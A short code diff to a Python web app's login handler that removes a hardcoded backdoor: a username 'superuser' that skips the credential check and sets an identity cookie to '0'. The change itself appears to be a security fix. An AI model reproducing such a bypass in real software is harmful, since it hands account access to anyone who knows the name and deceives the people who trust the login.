@@ -12,12 +12,6 @@ def main():
 
 @app.post('/in')
 def login():
-    if request.form['user'] == 'superuser':
-        r = make_response(redirect('/welcome'))
-        r.set_cookie('user', '0')
-
-        return r
-
     q = db.session.execute(text('select id, secret from users where nick=:a'), {
       'a': request.form['user']
     }).fetchone()
